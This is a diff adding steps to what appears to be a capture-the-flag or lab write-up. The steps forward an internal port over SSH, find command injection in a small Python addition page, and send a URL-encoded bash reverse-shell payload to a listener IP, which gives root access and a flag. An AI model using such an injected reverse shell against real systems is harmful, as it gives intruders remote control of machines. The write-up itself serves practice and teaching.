@@ -68,7 +68,25 @@ A port that didn't show up during recon ,looked into it a bit more with `pspy`
 
 ![image of pspy](images/pspy.png)
 
-Used ssh local port forwarding to open the local page:`ssh -L 8080:127.0.0.1:8080 juniordev@10.150.150.38 -i id_rsa -fN` 
-and the we have a page now.
+Used ssh local port forwarding to open the local page:  
+`ssh -L 8080:127.0.0.1:8080 juniordev@10.150.150.38 -i id_rsa -fN`   
+and open my local page, we have a page now.
 
-It looks like a simple additiion page created in python.
+![alt text](images/pypage.png)
+
+It looks like a simple additiion page created in python.  
+There might be a chance to do some command injection.  
+There is, some Burpsuite, Python and an ASCII table go a long way.
+
+`%2Fbin%2Fbash+-i+>%26+%2Fdev%2Ftcp%2F10.66.67.138%2F4444+0>%261`
+
+![](images/burp.png)
+![](images/root.png)
+
+Found a flag, and an image that could be a flag, will have to transfer it and look into the pic.  
+Found a way to transfer it here `https://medium.com/@PenTest_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65`  
+
+Got the image, opened it, got the flag and we're Done.  
+
+![](images/final.png)
+
